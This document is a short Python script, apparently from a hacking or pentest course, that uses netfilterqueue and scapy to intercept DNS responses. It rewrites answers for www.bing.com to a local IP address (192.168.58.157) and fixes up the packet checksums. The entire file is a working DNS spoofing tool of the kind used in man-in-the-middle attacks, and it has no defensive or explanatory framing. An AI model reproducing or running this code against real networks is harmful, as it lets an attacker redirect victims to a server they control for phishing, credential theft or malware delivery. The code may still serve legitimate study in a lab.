#!/usr/bin/env python3

import netfilterqueue as netfil
import scapy.all as scapy

def processPacket(packet):
    packetScapy=scapy.IP(packet.get_payload())
    if packetScapy.haslayer(scapy.DNSRR):
        #print(packetScapy.show())
        qName=packetScapy[scapy.DNSQR].qname
        url="www.bing.com"
        if url in str(qName):
            print(" [+] Spoofing target.....")
            spoofAnswer = scapy.DNSRR(rrname=qName,rdata="192.168.58.157")
            packetScapy[scapy.DNS].an = spoofAnswer
            packetScapy[scapy.DNS].ancount = 1
            delete(packetScapy)

            packet.set_payload(bytes(packetScapy))

    packet.accept()

def delete(deleteLayersFields):
    del deleteLayersFields[scapy.IP].len
    del deleteLayersFields[scapy.IP].chksum
    del deleteLayersFields[scapy.UDP].chksum
    del deleteLayersFields[scapy.UDP].len

queue=netfil.NetfilterQueue()
queue.bind(0,processPacket)

try:

    queue.run()
except KeyboardInterrupt:
    print("[+] Has pulsado ctrl+c....saliendo del programa....")
